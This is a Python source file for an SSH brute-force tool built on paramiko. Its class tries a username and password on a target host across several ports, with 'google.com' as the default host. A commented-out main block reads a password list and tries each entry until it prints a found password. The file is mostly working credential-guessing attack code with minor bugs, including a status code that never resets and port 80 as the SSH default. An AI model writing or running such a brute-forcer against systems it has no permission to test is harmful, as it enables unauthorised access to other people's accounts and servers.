"""
   Copyright 2021-present real-supreme

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.
"""


import os
import socket
import sys

import paramiko as pk


class bruteforce:
    def __init__(
        self, **kwargs
    ):  # host, username = "msfadmin", ports=[*range(100)], passwords="passwords.txt"):
        self.passwords = kwargs.get("passwords", "password")
        self.host = kwargs.get("host", "google.com")
        self.ssh = pk.SSHClient()
        self.code = 0
        self.username = kwargs.get("username", "msfadmin")
        self.ports = kwargs.get("ports", [80])
        try:
            self.port = self.ports[0]
        except IndexError:
            self.port = 80

    def connect_ssh(self, ports):
        self.port = ports
        try:
            print(f"Connection Attempt: \nHost [{self.host}]\nport={self.port},self.")
            self.ssh.connect(self.host, self.port, self.username, self.passwords)
        except pk.AuthenticationException:
            self.code = 1
        except socket.error:
            self.code = -1
        finally:
            return self.code

    def ssh_connector(self):
        print("Entered connector")
        self.ssh.set_missing_host_key_policy(pk.AutoAddPolicy())
        codes = []
        print(f"[ - ]  Entered connector {self.ports}")
        for ports in self.ports:
            codes.append(self.connect_ssh(ports))
        return codes


if __name__ == "__main__":
    pass
    # def ssh_connect(password, code=0):
    #     ssh = paramiko.SSHClient()
    #     ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    #     try:
    #         ssh.connect(host, port=22, username=username, password=password)
    #     except paramiko.AuthenticationException:
    #         code = 1
    #     except socket.error:
    #         code = 2
    #     ssh.close()
    #     return code

    # host = input("[+] Target Address: ")
    # username = input("[+] SSH Username: ")
    # input_file = input("[+] Password Files: ")
    # if os.path.exists(input_file) == False:
    #     print("[!!] The File/Path Doesnt Exist")
    #     sys.exit(1)
    # with open(input_file, "r") as file:
    #     for line in file.readlines():
    #         password = line.strip()
    #         try:
    #             response = ssh_connect(password)
    #             if response == 0:
    #                 print(
    #                     termcolor.colored(
    #                         "[+] Found Password: "
    #                         + password
    #                         + ", For Account: "
    #                         + username,
    #                         "green",
    #                     )
    #                 )
    #                 break
    #             elif response == 1:
    #                 print("[-] Incorrect Login" + password)
    #             elif response == 2:
    #                 print("[!!] Cant connect")
    #                 sys.exit()
    #         except Exception as e:
    #             print(e)
